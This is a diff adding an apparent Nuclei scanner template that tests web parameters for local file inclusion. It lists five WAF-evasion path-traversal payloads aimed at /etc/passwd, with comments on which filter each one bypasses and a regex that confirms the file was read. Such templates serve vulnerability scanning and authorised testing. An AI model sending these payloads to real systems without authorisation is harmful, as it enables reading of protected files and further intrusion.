@@ -1,0 +1,44 @@
+id: advanced-lfi-waf-bypass
+
+info:
+  name: Advanced LFI Bypass (WAF Evasion)
+  author: thenawabx
+  severity: high
+  description: Targeted at bypassing modern WAFs using double encoding and traversal techniques to read system files.
+  tags: lfi, advanced, waf-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file={{payload}}"
+      - "{{BaseURL}}/?path={{payload}}"
+      - "{{BaseURL}}/?page={{payload}}"
+      - "{{BaseURL}}/?doc={{payload}}"
+
+    payloads:
+      payload:
+        # 1. Standard Traversal (Bypassed if WAF is weak)
+        - "../../../../etc/passwd"
+        # 2. Double URL Encoding (Bypasses keyword-based WAFs)
+        - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
+        # 3. Null Byte Injection (Bypasses filename suffix checks)
+        - "../../../../etc/passwd%00"
+        # 4. Dot Truncation bypass
+        - "../../../../etc/passwd/./././././."
+        # 5. Nested Traversal Bypass
+        - "....//....//....//etc/passwd"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Verifies if the root user info is present in the response (100% Confirmation)
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      # Ensures successful 200 OK response
+      - type: status
+        status:
+          - 200
